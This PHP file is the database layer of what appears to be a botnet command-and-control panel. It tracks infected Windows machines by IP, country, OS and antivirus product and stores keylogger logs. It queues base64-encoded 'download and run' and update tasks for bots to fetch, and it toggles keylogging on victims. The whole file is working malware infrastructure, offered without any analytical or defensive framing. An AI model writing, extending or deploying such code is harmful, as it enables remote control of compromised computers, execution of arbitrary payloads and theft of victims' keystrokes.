<?php

include_once("config.php");

class db_req
{
    private $v_connection;
    private $v_req_time;

    public function __construct()
    {
        $this->v_connection = null;
        $this->v_req_time = time();
    }

    public function error()
    {
        if ($this->v_connection != null)
        {
            return print_r($this->v_connection->errorInfo());
        }
    }

    public function __destruct()
    {
        $this->v_connection = null;
    }

    public function transaction_start()
    {
        return $this->v_connection->beginTransaction();
    }
    
    public function transaction_rollback()
    {
        $this->v_connection->rollback();
    }

    public function transaction_commit()
    {
        $this->v_connection->commit();
    }

    // false on failure
    public function sql_query_safe($query, $params = null)
    {
        $st = $this->v_connection->prepare($query);
        if($st !== false)
        {
            return $st->execute($params);
        }
        return false;
    }

    // row count if success or 0 if no row was affected
    public function sql_update_safe($query, $params = null)
    {
        $st = $this->v_connection->prepare($query);
        if($st !== false && $st->execute($params) == true)
        {
            return $st->rowCount();
        }
        return 0;
    }

    // false on failure
    public function sql_fetch($query, $params = null)
    {
        $st = $this->v_connection->prepare($query);
        if($st !== false && $st->execute($params) === true)
        {
            return $st->fetch(PDO::FETCH_ASSOC);
        }
        return false;
    }

    // false on failure
    public function sql_fetch_all($query, $params = null)
    {
        $st = $this->v_connection->prepare($query);
        if($st !== false && $st->execute($params) === true)
        {
            return $st->fetchall(PDO::FETCH_ASSOC);
        }
        return false;
    }

    public function sql_count_rows($table, $condition = "", $params = null)
    {
        $query  = "SELECT COUNT(*) FROM `" . $table . "`" . (strlen($condition) ? " WHERE " . $condition : "");
        if(($f = $this->sql_fetch($query, $params)) !== false)
        {
            return $f["COUNT(*)"];
        }
        return 0;
    }


    public function connect()
    {
        try
        {
            $host = SQL_HOST;
            $db = DB_NAME;
            $this->v_connection = new PDO("mysql:host=$host;dbname=$db", SQL_USER, SQL_PASSWORD);
            $this->v_connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        }
        catch(PDOException $e) { return $e; }
        return true;
    }

    public function get_ip_info($ip_string)
    {
        $ip_bin = inet_pton($ip_string);
        $ip_info = array(
            "country_code" => "@@", 
            "country_name" => "Unknown", 
            "ip_address_sz" => $ip_string, 
            "ip_address_bin" => $ip_bin
        );

        $st = $this->v_connection->prepare("SELECT * FROM `geoip` WHERE (INET_ATON(:ip) BETWEEN INET_ATON(`ip_sz_begin`) AND INET_ATON(`ip_sz_end`))");
        if($st !== false && $st->execute(array("ip" => $ip_string)) === true)
        {
            if(($f = $st->fetch(PDO::FETCH_ASSOC)) !== false)
            {
                $ip_info["country_code"] = $f["country_code"];
                $ip_info["country_name"] = $f["country_name"];
            }
        }
        return $ip_info;
    }

    public function get_dashboard()
    {
        $old_days = (60 * 60 * 24 * UNACTIVE_BOT_DAYS);
        $curr_time = $this->v_req_time;
        $active = TASK_ACTIVE;
        $ret["bots_total"] = $this->sql_count_rows("bots");
        $ret["bots_active"] = $this->sql_count_rows("bots", "`last_seen` + $old_days > $curr_time");
        $ret["bots_online"] = $this->sql_count_rows("bots", "`last_seen` + (60 * `reg_interval`) > $curr_time");
        $ret["tasks_total"] = $this->sql_count_rows("tasks");
        $ret["saved_logs"] = $this->sql_count_rows("logs");
        $ret["tasks_active"] = $this->sql_count_rows("tasks", "`status` = $active");
        $ret["country_list"] = array();


        if(($b_list = $this->sql_fetch_all("SELECT `country_code`, `country_name`, COUNT(*) `c` FROM `bots` GROUP BY `country_name` ORDER BY `c` DESC LIMIT 10")) !== false)
        {
            foreach($b_list as $l) {

                $d = $this->sql_fetch("SELECT 
                    COUNT(CASE WHEN `country_code` = '". $l["country_code"] . "' THEN 1 END) AS total,
                    COUNT(CASE WHEN `country_code` = '" . $l["country_code"] . "' AND `last_seen` + $old_days > $curr_time THEN 1 END) AS active, 
                    COUNT(CASE WHEN `country_code` = '" . $l["country_code"] . "' AND `last_seen` + (60 * `reg_interval`) > $curr_time THEN 1 END) AS online
                    FROM `bots`"
                    );

                $e = array(
                    "code" => $l["country_code"],
                    "name" => $l["country_name"],
                    "total" => $d["total"],
                    "active" => $d["active"],
                    "online" => $d["online"],
                    "lost" => 0
                    );

                array_push($ret["country_list"], $e);
            }
        }

        return $ret;
    }

    public function get_bots($offset, $limit, $cond = "", $params = null)
    {
        $bots = array();
        if(strlen($cond)) $cond = " WHERE " . $cond;
        $list = $this->sql_fetch_all("SELECT * FROM `bots`" . $cond . " ORDER BY `last_seen` DESC LIMIT $limit", $params);
        if($list !== false && is_array($list))
        {
            foreach($list as $i)
            {
                array_push(
                    $bots,
                    array(
                        "bot_id" => strtoupper($i["bot_id"]),
                        "ip_address" => $i["ip_address_sz"],
                        "country_code" => $i["country_code"],
                        "country_name" => $i["country_name"],
                        "country_flag_path" => ($i["country_code"] == "@@") ? "" : "<img src=\"images/" . strtolower($i["country_code"]) . ".png\"/>",
                        "win_version" => format_win_version($i["os_int"], $i["os_64b"]),
                        "antivirus" => strlen($i["antivirus"]) ? base64_decode($i["antivirus"]) : "None",
                        "version" => format_ver($i["bot_version"]),
                        "last_seen" => format_date($i["last_seen"]),
                        "status" => format_status($this->v_req_time, $i["last_seen"], $i["reg_interval"])
                    )
                );
            }
        }
        return $bots;
    }

    public function get_search_bots($botid, $country, $os, $arch, $offset, $limit)
    {
        $sqlc = "";
        $sqlparams = array();

        if($botid != "*")
        {
            if(strlen($sqlc)) $sqlc .= " AND ";
            $sqlc .= "`bot_id` = :bot_id";
            $sqlparams["bot_id"] = $botid;
        }
        if($country != "*")
        {
            if(strlen($sqlc)) $sqlc .= " AND ";
            $sqlc .= "`country_name` = :country_name";
            $sqlparams["country_name"] = $country;
        }
        if($os != "*")
        {
            if(strlen($sqlc)) $sqlc .= " AND ";
            $sqlc .= "`os_int` = :os_int";
            $sqlparams["os_int"] = $os;
        }
        if($arch != "*")
        {
            if(strlen($sqlc)) $sqlc .= " AND ";
            $sqlc .= "`os_64b` = :os_64b";
            $sqlparams["os_64b"] = $arch;
        }

        return $this->get_bots(0, 50, $sqlc, count($sqlparams) ? $sqlparams : null);
    }
    
    public function get_tasks($offset, $limit)
    {
        $tasks = array();
        $list = $this->sql_fetch_all("SELECT * FROM `tasks` WHERE (`arh` = 0) ORDER BY `reg_date` DESC LIMIT $limit");
        if($list !== false && is_array($list))
        {
            foreach($list as $i)
            {
                array_push(
                    $tasks,
                    array(
                        "id" => $i["id"],
                        "name" => $i["name"],
                        "action" => format_task_action_name($i["action"]),
                        "string_encoded" => $i["string_encoded"],
                        "max_execution" => $i["max_execution"],
                        "execution_count" => $i["execution_count"],
                        "target_id" => $i["target_id"],
                        "reg_date" => format_date($i["reg_date"]),
                        "status" => format_task_status($i["status"])
                    )
                );
            }
        }
        return $tasks;
    }
    
    public function get_logs($offset, $limit, $cond = "", $params = null)
    {
        $logs = array();
        if(strlen($cond)) $cond = " WHERE " . $cond;
        $list = $this->sql_fetch_all("SELECT * FROM `logs`" . $cond . " ORDER BY `last_update` DESC LIMIT $limit", $params);
        if($list !== false && is_array($list))
        {
            foreach($list as $i)
            {
                array_push(
                    $logs,
                    array(
                        "bot_id" => $i["bot_id"],
                        "last_update" => format_date($i["last_update"])
                    )
                );
            }
        }
        return $logs;
    }

    public function get_search_logs($botid, $offset, $limit)
    {
        $sqlc = "";
        $sqlparams = array();

        if($botid != "*")
        {
            if(strlen($sqlc)) $sqlc .= " AND ";
            $sqlc .= "`bot_id` = :bot_id";
            $sqlparams["bot_id"] = $botid;
        }

        return $this->get_logs(0, 50, $sqlc, count($sqlparams) ? $sqlparams : null);
    }

    public function create_task($name, $action, $param1, $param2, $targetid, $maxexecution)
    {
        switch($action)
        {
            case "downrun":
            {
                $action = TASK_DOWNLOAD_RUN;
                break;
            }
            case "updateapp":
            {
                $param1 = "";
                $action = TASK_UPDATE;
                break;
            }
            default: return false;
        }

        $string_encoded = base64_encode("ac=" . $action . "&p1=" . base64_encode($param1) . "&p2=" . base64_encode($param2));
        if(strlen($targetid)) $maxexecution = 1;

        $p["name"] = $name;
        $p["action"] = $action;
        $p["string_encoded"] = $string_encoded;
        $p["max_execution"] = $maxexecution;
        $p["execution_count"] = 0;
        $p["target_id"] = $targetid;
        $p["reg_date"] = $this->v_req_time;
        $p["status"] = TASK_ACTIVE;
        
        return $this->sql_query_safe("INSERT INTO `tasks` (`name`, `action`, `string_encoded`, `max_execution`, `execution_count`, `target_id`, `reg_date`, `status` ) VALUES (:name, :action, :string_encoded, :max_execution, :execution_count, :target_id, :reg_date, :status)", $p);
    }

    public function get_config()
    {
        $cf = array("bots_interval" => DEFAULT_BOTS_INTERVAL, "keylog_enabled" => DEFAULT_KEYLOG_ENABLED);
        $trow = $this->sql_fetch("SELECT * FROM `config`");
        if($trow !== false)
        {
            $cf["bots_interval"] = $trow["bots_interval"];
            $cf["keylog_enabled"] = $trow["keylog_enabled"];
        }
        return $cf;
    }

    public function get_config_bot()
    {
        $cfg = $this->get_config();
        return base64_encode("bi=" . $cfg["bots_interval"] . "&kl=" . $cfg["keylog_enabled"]);
    }

    public function get_task_bot($botid)
    {
        $re = "";
        $tactive = TASK_ACTIVE;
        $tcompleted = TASK_COMPLETED;
        
        if($this->transaction_start())
        {
            try
            {
                $p["bot_id"] = $botid;
                if(($trow = $this->sql_fetch("SELECT * FROM `tasks` WHERE `status` = $tactive AND NOT EXISTS (SELECT `id` FROM `regs` WHERE `task_id` = `tasks`.`id` AND `bot_id` = :bot_id) LIMIT 1 FOR UPDATE", $p)) !== false)
                {
                    if(is_array($trow) && count($trow))
                    {
                        if(strlen($trow["target_id"])) 
                        {
                            if($trow["target_id"] != $botid)
                            {
                                throw new PDOException("", 0);
                            }
                        }

                        $re = $trow["string_encoded"];
                        $id = $trow["id"];
                        $r["task_id"] = $id;
                        $r["bot_id"] = $botid;
                        $this->sql_query_safe("INSERT INTO `regs` ( `task_id`, `bot_id` ) VALUES ( :task_id, :bot_id )", $r);
                        $this->sql_update_safe("UPDATE `tasks` SET `execution_count` = `execution_count` + 1 WHERE (`id` =  $id)");
                        $this->sql_update_safe("UPDATE `tasks` SET `status` = $tcompleted WHERE (`id` =  $id AND `max_execution` > 0 AND `execution_count` >= `max_execution`)");
                    }
                }

                $this->transaction_commit();
            }
            catch(PDOException $e) {
                $this->transaction_rollback();
            }
        }

        return $re;
    }

    public function hide_task_bot($id_task)
    {
        if($this->transaction_start())
        {
            try
            {
                $this->sql_update_safe("UPDATE `tasks` SET `arh` = 1 WHERE (`id` =  $id_task )");
                $this->transaction_commit();
            }
            catch(PDOException $e) {
                $this->transaction_rollback();
            }
        }
    }

}
